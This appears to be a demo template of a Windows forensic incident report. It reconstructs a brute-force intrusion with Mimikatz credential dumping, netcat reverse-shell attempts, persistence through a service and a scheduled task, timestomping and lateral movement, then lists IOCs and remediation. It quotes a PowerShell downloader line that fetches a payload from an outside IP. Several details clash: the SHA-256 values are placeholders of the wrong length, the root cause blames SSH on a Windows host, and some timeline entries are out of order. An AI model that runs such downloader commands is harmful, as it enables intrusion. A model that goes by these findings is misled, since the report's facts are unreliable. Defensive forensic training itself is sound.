# Forensic Investigation Report

**Case ID:** INC-2024-0114-001
**Report Date:** 2024-01-15
**Analyst:** [Analyst Name]
**System:** ALICE-WORKSTATION (192.168.1.101, Windows 10 Enterprise 22H2)
**Incident Date:** 2024-01-14
**Classification:** CONFIDENTIAL

---

## Executive Summary

On 2024-01-14, a threat actor gained unauthorized access to ALICE-WORKSTATION by first connecting a USB storage device containing credential files (`passwords.xlsx`, `creds.txt`), then using those credentials in a network brute-force attack against alice's account.
After authentication at 14:47:23 UTC, the attacker executed Mimikatz to dump NTLM hashes from LSASS memory, deployed a reverse shell via netcat, and established multi-layer persistence through a malicious Windows service and a scheduled task containing an encoded PowerShell downloader.
The Security event log was subsequently cleared, but Sysmon and Prefetch artifacts survived and provide a near-complete reconstruction of attacker activity.
The attacker demonstrated lateral movement capability, with PsExec evidence placing activity on SERVER02 the following day.

---

## Incident Timeline

| Time (UTC)   | Event                                                                 | Source           | Severity |
|--------------|-----------------------------------------------------------------------|------------------|----------|
| 14:20:15     | USB connected: SanDisk Ultra (serial: 4C530001030622111552)           | USBSTOR registry | HIGH     |
| 14:21:05     | `setup.exe` executed from Downloads                                   | UserAssist       | MEDIUM   |
| 14:22:30     | `E:\passwords.xlsx` accessed (credential file from USB)               | LNK + Event 4663 | HIGH     |
| 14:23:05     | `E:\creds.txt` accessed (credential file from USB)                    | LNK              | HIGH     |
| 14:23:01     | Brute-force initiated: repeated 4625 (Failed Logon) from 10.0.5.123  | Security log     | HIGH     |
| 14:47:23     | 4624: Successful logon — `alice` from 10.0.5.123 (after 247 failures) | Security log     | CRITICAL |
| 14:48:01     | `mimikatz.exe` launched (`sekurlsa::logonpasswords`)                  | Sysmon Event 1   | CRITICAL |
| 14:48:02     | Sysmon 10: `mimikatz.exe` → `lsass.exe` (access mask 0x1010)         | Sysmon Event 10  | CRITICAL |
| 14:48:05     | `lsass.dmp` written to `%TEMP%`                                       | Sysmon Event 11  | CRITICAL |
| 14:49:10     | `nc64.exe` executed ×3 — reverse shell attempts to 10.0.5.123:4444    | Prefetch         | CRITICAL |
| 14:50:15     | Event 7045: Service `WindowsUpdater` installed (`svchost32.exe`)      | System log       | CRITICAL |
| 14:50:17     | Event 4698: Scheduled task `\WindowsTelemHelper` created (encoded PS) | Security log     | CRITICAL |
| 14:52:00     | `svchost32.exe` begins execution (C2 beacon active)                   | UserAssist       | CRITICAL |
| 14:55:42     | USB disconnected                                                      | USBSTOR registry | INFO     |
| 15:10:44     | Event 1102: Security audit log cleared by `alice`                     | Security log     | HIGH     |
| 2024-01-15 09:10 | `backdoor` account (support_svc) used for re-entry from 10.0.5.123 | Security log  | CRITICAL |
| 2024-01-15 09:15 | PsExec ran from `\\SERVER02\` — confirmed lateral movement           | Prefetch         | CRITICAL |

---

## Forensic Artifacts

### 1. Malware Files Identified

| File | Hash (SHA-256) | Location | Status |
|------|---------------|----------|--------|
| `svchost32.exe` | `99887766aabbccdd112233445566778899aabbcc` | `C:\ProgramData\` | Present on disk |
| `mimikatz.exe`  | `f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0` | `C:\Users\alice\AppData\Local\Temp\` | **Deleted** (proven by Prefetch) |
| `lsass.dmp`     | `a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9` | `C:\Users\alice\AppData\Local\Temp\` | **Deleted** |
| `nc64.exe`      | `b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0` | `C:\Users\alice\Downloads\` | Present on disk |
| `net.dat`       | `c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1` | `C:\ProgramData\` | Present on disk |

### 2. Persistence Mechanisms

| Type              | Name                 | Details                                                               | Status |
|-------------------|----------------------|-----------------------------------------------------------------------|--------|
| Registry Run Key  | `WindowsUpdater`     | `HKLM\...\Run` → `C:\ProgramData\svchost32.exe` (added 2024-01-14 02:47) | **Active** |
| Windows Service   | `WindowsUpdater`     | Event 7045. Path: `C:\ProgramData\svchost32.exe`, Account: SYSTEM, Start: Automatic | **Active** |
| Scheduled Task    | `\WindowsTelemHelper`| Encoded PS downloader: `IEX ... DownloadString('http://185.220.11.55/payload.ps1')`. Trigger: At Logon. RunAs: SYSTEM | **Active** |

### 3. Timestomping Evidence

**File:** `C:\ProgramData\svchost32.exe`

| Timestamp Source | Created | Modified |
|-----------------|---------|---------|
| `$STANDARD_INFORMATION` (user-visible) | 2020-03-15 08:00:00 | 2020-03-15 08:00:00 |
| `$FILE_NAME` (NTFS kernel, tamper-resistant) | **2024-01-14 14:50:15** | **2024-01-14 14:50:15** |

**Conclusion:** Timestomping confirmed. The attacker used a tool (likely `timestomp.exe` or PowerShell `[IO.File]::SetCreationTime()`) to backdate the `$STANDARD_INFORMATION` timestamps by approximately 4 years, attempting to make the malware appear as a legitimate pre-installed binary.

### 4. Indicators of Compromise (IOCs)

| Category | IOC | Context |
|----------|-----|---------|
| Network  | `10.0.5.123` | Attacker source IP (brute force + initial access) |
| Network  | `185.220.11.55` | C2 server (PowerShell downloader, beacon URL) |
| File     | `C:\ProgramData\svchost32.exe` | Malware beacon executable |
| File     | `C:\Users\alice\Downloads\nc64.exe` | Netcat reverse shell tool |
| Registry | `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsUpdater` | Malware persistence |
| Task     | `\WindowsTelemHelper` | PowerShell web cradle downloader |
| USB      | Serial `4C530001030622111552` (SanDisk Ultra) | USB used to deliver credential files |
| Hash     | `f1a2b3c4...` (mimikatz.exe) | Credential dumper |
| URL      | `http://185.220.11.55/payload.ps1` | Remote payload URL |
| URL      | `http://185.220.11.55/c2/checkin` | C2 beacon endpoint |

---

## Root Cause Analysis

### Primary Root Cause

The `alice` account had a password that was guessable within 247 attempts.
No account lockout policy was in place to prevent brute-force attacks.
SSH password authentication was enabled — key-only authentication would have prevented this entirely.

### Contributing Factors

1. **No SSH key enforcement:** Password authentication allowed. Key-only SSH would have made the brute force impossible.
2. **No account lockout:** 247 failed attempts succeeded without triggering a lockout.
3. **Wdigest enabled:** Plaintext credentials were stored in LSASS memory. Disabling Wdigest (`HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential = 0`) would have prevented plaintext recovery.
4. **No LSA Protection (RunAsPPL):** LSASS was not protected as a Protected Process Light. Mimikatz could access LSASS memory directly.
5. **No Credential Guard:** Credentials were not isolated in the VBS secure enclave.
6. **USB access unrestricted:** No policy blocking USB storage device usage.

---

## Impact Assessment

| Area | Impact | Evidence |
|------|--------|---------|
| Credential Compromise | HIGH — NTLM hashes extracted (Mimikatz), plaintext visible (Wdigest) | Prefetch: lsass.dmp created |
| Data Access | MEDIUM — Financial and HR documents potentially accessed | LNK files, Event 4663 SACL |
| Persistent Access | HIGH — Service + Scheduled task survive reboots | Registry, Event 7045, 4698 |
| Lateral Movement | HIGH — PsExec to SERVER02 confirmed | Prefetch: PsExec from \\SERVER02\ |
| Evidence Destruction | MEDIUM — Security log cleared, malware files deleted | Event 1102, Prefetch proves execution |

---

## Recommended Immediate Actions

1. **Isolate ALICE-WORKSTATION** from the network immediately to stop C2 communication.
2. **Isolate SERVER02** — PsExec evidence confirms the attacker reached this system.
3. **Reset all credentials** for alice, support_svc, and any account logged on to ALICE-WORKSTATION.
4. **Block IOC IPs** at the perimeter: `10.0.5.123`, `185.220.11.55`.
5. **Search domain-wide** for `svchost32.exe`, scheduled task `WindowsTelemHelper`, and registry key `WindowsUpdater`.

## Recommended Remediation

1. **Enforce SSH/RDP key authentication** — disable password authentication.
2. **Implement account lockout** — 5 failed attempts → 15-minute lockout.
3. **Enable LSA Protection** (`HKLM\SYSTEM\...\Lsa\RunAsPPL = 1`) on all endpoints.
4. **Disable Wdigest** (`HKLM\SYSTEM\...\WDigest\UseLogonCredential = 0`).
5. **Enable Credential Guard** on supported Windows 10/11 endpoints.
6. **Block USB storage** via Group Policy or device control software.
7. **Deploy Sysmon** with a comprehensive configuration on all endpoints.
8. **Implement SIEM alert** on Event ID 4625 bursts followed by 4624 from the same source IP.

---

## MITRE ATT&CK Mapping

| Tactic | Technique | Evidence |
|--------|-----------|---------|
| Initial Access | T1110.001 — Brute Force: Password Guessing | 247 × Event 4625, then 4624 |
| Credential Access | T1003.001 — LSASS Memory (Mimikatz) | Prefetch, Sysmon 10 |
| Persistence | T1543.003 — Create/Modify System Process: Windows Service | Event 7045 |
| Persistence | T1053.005 — Scheduled Task/Job: Scheduled Task | Event 4698 |
| Defense Evasion | T1070.001 — Indicator Removal: Clear Windows Event Logs | Event 1102 |
| Defense Evasion | T1070.006 — Indicator Removal: Timestomp | MFT $SI vs $FN analysis |
| Lateral Movement | T1021.002 — Remote Services: SMB/Windows Admin Shares (PsExec) | Prefetch volume: \\SERVER02\ |
| Exfiltration | T1052.001 — Exfiltration Over Physical Medium: USB | USB + LNK correlation |

---

*Report template generated by the Windows Forensics Demo — Demo 03, Session 12 Security Operations.*
*Replace bracketed placeholders with actual values when using for real investigations.*
